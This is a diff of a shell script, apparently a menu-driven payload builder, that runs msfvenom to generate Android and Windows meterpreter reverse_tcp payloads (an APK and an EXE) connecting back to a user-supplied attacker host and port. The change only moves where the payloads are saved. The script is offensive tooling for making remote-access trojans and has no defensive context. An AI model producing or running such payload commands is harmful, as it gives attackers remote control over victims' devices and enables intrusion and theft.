@@ -62,7 +62,7 @@ sleep 2
 read -p "name===> " n
 cd
 cd metasploit-framework
-msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$p R >  root/Desktop$n.apk
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$p R >  /root/max/$n.apk
 echo -e " $p  Path of the pyload----->  $yellow  /sdcard/$n.apk"
 sleep 2
 
@@ -79,7 +79,7 @@ sleep 2
 read -p "name===> " nn
 cd
 cd metasploit-framework
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ipp LPORT=$pp -f exe e >  root/Desktop$nn.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ipp LPORT=$pp -f exe e >  /root/max/$nn.exe
 echo -e "$cyan    Path of the pyload-----> $yellow  /sdcard/$nn.exe"
 sleep 2
 read -p "-------->entar"
